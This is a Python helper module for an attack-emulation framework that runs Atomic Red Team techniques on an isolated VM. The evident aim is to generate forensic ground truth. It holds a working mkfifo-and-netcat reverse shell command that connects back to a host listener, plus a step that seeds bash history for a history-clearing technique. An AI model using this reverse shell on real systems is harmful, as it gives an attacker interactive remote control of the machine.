"""
orchestrator/attacks/helpers.py

Reusable primitives shared across all scenario modules.

ArtStep     -- declarative descriptor for a single ART-backed step.
run_art_step    -- run prereqs (if any) + test + log result.
run_art_cleanup -- call ART cleanup_command + append to steps list.
run_reverse_shell -- bind host listener, trigger mkfifo+nc on VM, verify.
plant_history   -- force ~/.bash_history to exist so T1070.003 has something to remove.
"""

from __future__ import annotations

import socket
import threading
import time
from dataclasses import dataclass, field
from typing import Any, Callable

from orchestrator.attacks.art_runner import ArtRunner
from orchestrator.core import console
from orchestrator.core.ssh_client import SSHClient
from typing import Protocol

_REVSHELL_PORT = 4444
_REVSHELL_TIMEOUT = 10


class ScenarioProtocol(Protocol):
    def run(
        self,
        ssh: SSHClient,
        runner: ArtRunner,
        host_ip: str,
        internet_on,
        internet_off,
        *,
        run_cleanup: bool = False,
    ) -> dict[str, Any]: ...


@dataclass
class ArtStep:
    name: str
    technique: str
    guid: str
    has_prereq: bool = False
    input_arguments: dict[str, str] = field(default_factory=dict)


def run_art_step(
    runner: ArtRunner,
    step: ArtStep,
    *,
    internet_on: Callable[[], None] | None = None,
    internet_off: Callable[[], None] | None = None,
    raise_on_error: bool = False,
    timeout: int = 60,
) -> dict[str, Any]:
    """
    Run prereqs (gated by internet_on/off) then run the ART test.
    Returns a step dict ready to append to ground_truth["steps"].
    """
    if step.has_prereq:
        if internet_on:
            internet_on()
        try:
            runner.run_prerequisites(
                step.technique,
                step.guid,
                input_arguments=step.input_arguments or None,
                timeout=timeout,
            )
        finally:
            if internet_off:
                internet_off()

    result = runner.run_test(
        step.technique,
        step.guid,
        input_arguments=step.input_arguments or None,
        raise_on_error=raise_on_error,
        timeout=timeout,
    )
    return {"step": step.name, **result}


def run_art_cleanup(
    runner: ArtRunner,
    step: ArtStep,
    steps: list[dict[str, Any]],
) -> None:
    """
    Run ART cleanup_command for step and append result to steps.
    Failure is always non-fatal (logged by ArtRunner.run_cleanup).
    """
    runner.run_cleanup(
        step.technique,
        step.guid,
        input_arguments=step.input_arguments or None,
    )
    steps.append({"step": f"cleanup_{step.name}", "run": True})


def plant_history(ssh: SSHClient, steps: list[dict[str, Any]]) -> None:
    """
    Force ~/.bash_history into existence so T1070.003 has something to remove.
    Without this the file is absent (all commands ran non-interactively) and
    the cleanup atomic exits 1 with "No such file or directory".
    """
    cmd = "bash -ic 'echo marker >> ~/.bash_history; history -w' 2>/dev/null; true"
    code, _, _ = ssh.run(cmd, timeout=10)
    console.ok("bash history planted", indent=True)
    steps.append({"step": "plant_history", "exit_code": code})


def run_reverse_shell(
    ssh: SSHClient,
    host_ip: str,
    steps: list[dict[str, Any]],
    *,
    port: int = _REVSHELL_PORT,
    timeout: int = _REVSHELL_TIMEOUT,
) -> None:
    """
    Bind a TCP listener on the host, trigger a mkfifo+nc reverse shell on the
    VM, send `id` to confirm the connection, then close it.

    Goal: leave a process with an open socket and any mapped .so in memory
    for forensic recovery. The shell exits immediately after `id`.

    host_ip: isolated-network gateway address as seen from the VM.
    Appends a step dict to `steps`.
    """
    received: list[str] = []
    error: list[str] = []

    def _listen() -> None:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
                srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                srv.bind(("0.0.0.0", port))
                srv.listen(1)
                srv.settimeout(timeout)
                conn, addr = srv.accept()
                console.ok(f"reverse shell connected from {addr}", indent=True)
                conn.sendall(b"id\n")
                time.sleep(0.8)
                data = conn.recv(4096).decode(errors="replace")
                clean = [
                    ln
                    for ln in data.splitlines()
                    if ln.strip()
                    and not ln.startswith("/bin/sh:")
                    and not ln.strip().startswith(("$", "#"))
                ]
                received.append("\n".join(clean).strip())
                conn.sendall(b"exit\n")
                conn.close()
        except Exception as exc:
            error.append(str(exc))

    # Listener must be bound before nc fires on the VM side.
    listener = threading.Thread(target=_listen, daemon=True)
    listener.start()
    time.sleep(0.3)

    fifo = "/tmp/.rs_fifo"
    cmd = (
        f"rm -f {fifo}; mkfifo {fifo}; "
        f"cat {fifo} | /bin/sh -i 2>&1 | nc {host_ip} {port} > {fifo} &"
    )
    code, _, _ = ssh.run(cmd, timeout=15)
    listener.join(timeout=timeout + 2)

    if error:
        console.warn(f"reverse shell listener error: {error[0]}", indent=True)
    elif not received:
        console.warn("reverse shell: no data received", indent=True)
    else:
        console.ok(f"id output: {received[0]}", indent=True)

    steps.append(
        {
            "step": "reverse_shell",
            "technique": "T1059.004",
            "exit_code": code,
            "connected": bool(received),
            "id_output": received[0] if received else "",
            "error": error[0] if error else "",
        }
    )
